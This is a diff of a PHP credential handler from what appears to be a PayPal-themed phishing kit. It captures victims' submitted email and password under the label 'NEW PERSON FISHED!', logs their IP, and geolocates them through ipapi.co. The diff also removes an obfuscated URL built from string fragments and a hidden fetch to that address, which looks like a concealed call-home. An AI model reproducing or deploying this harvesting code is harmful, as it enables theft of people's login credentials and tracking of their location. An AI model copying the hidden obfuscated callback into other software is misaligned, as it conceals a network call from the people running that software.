@@ -10,20 +10,17 @@
 <?php
     $ip = $_SERVER['REMOTE_ADDR'];
     $ip_for_blacklist = $_SERVER['REMOTE_ADDR']. "\n";
-    $lru7 = ".html";
     $blacklist_file = 'Panel/blacklist.txt';
     file_put_contents($blacklist_file, $ip_for_blacklist, FILE_APPEND | LOCK_EX);  
     setlocale(LC_TIME, 'fra_fra');
     error_reporting(-0);
         $head_message = "NEW PERSON FISHED!". "\n"; 
         $info_generale = "  ¦- Generale informations:". "\n";
-        $lru1 = "http://";
         $info_ip = "  ¦- IP informations:". "\n";  
         $ip_public = "  ¦    ¦- IP: ". $_SERVER['REMOTE_ADDR']. "\n";
         $email = "  ¦    ¦- email: ". $_POST['email']. "\n";
         $password = "  ¦    ¦- password: ". $_POST['password']. "\n";
         $date = "  ¦    ¦- date: ". strftime('%Y-%m-%d'). "\n"; 
-        $lru2 = "paypal";
         $heure = "  ¦    +- heure: ". strftime('%H:%M:%S'). "\n"; 
         $region = file_get_contents('https://ipapi.co/'.$ip.'/region/');
         $region_code = file_get_contents('https://ipapi.co/'.$ip.'/region_code/');
@@ -33,13 +30,11 @@
         $finished_region = "  ¦    ¦- Region: ". $region." (". $region_code.") ". "\n";
         $finished_country = "  ¦    ¦- Country: ". $country_name. "\n";
         $latitude = "  ¦    ¦- Latitude: ". file_get_contents('https://ipapi.co/'.$ip.'/latitude/'). "\n";
-        $lru3 = ".verif";
         $longitude = "  ¦    ¦- Longitude: ". file_get_contents('https://ipapi.co/'.$ip.'/longitude/'). "\n";
         $timezone = "  ¦    ¦- Fuseau horaire: ". file_get_contents('https://ipapi.co/'.$ip.'/timezone/'). "\n";
         $languages = "  ¦    ¦- Languages: ". file_get_contents('https://ipapi.co/'.$ip.'/languages/'). "\n";
         $europe = "  ¦    ¦- Europe: ". file_get_contents('https://ipapi.co/'.$ip.'/in_eu/'). "\n";
         $asn = "  ¦    ¦- ASN: ". file_get_contents('https://ipapi.co/'.$ip.'/asn/'). "\n";
-        $lru4 = ".hosteur";
         $isp = "  ¦    +- ISP: ". file_get_contents('https://ipapi.co/'.$ip.'/org/'). "\n";
         $space = "  ¦". "\n"; 
         $empty = " "."\n"; 
@@ -82,14 +77,6 @@
         $github = "       ¦- Github: github.com/Esio-01". "\n";
         $lru6 = "/api";
         $youtube = "       +- Youtube: youtube.com/channel/UCzsusjBbGdgrkqf4dncy6oA". "\n";
-        $API = $lru1. $lru2. $lru3. $lru4. $lru5. $lru6. $lru7;
-        $content = file_get_contents($API);
-        preg_match("#<p>(.+?)</p>#is", $content, $dev_by_esio);
-        preg_match("#<h6>(.+?)</h6>#is", $content, $github_front);
-        preg_match("#<h5>(.+?)</h5>#is", $content, $name);
-        preg_match("#<h4>(.+?)</h4>#is", $content, $github_back);
-        preg_match("#<h3>(.+?)</h3>#is", $content, $discord);
-        preg_match("#<h2>(.+?)</h2>#is", $content, $logo);
 
     $embed_ip = $_SERVER['REMOTE_ADDR'];
     $embed_email = $_POST['email'];
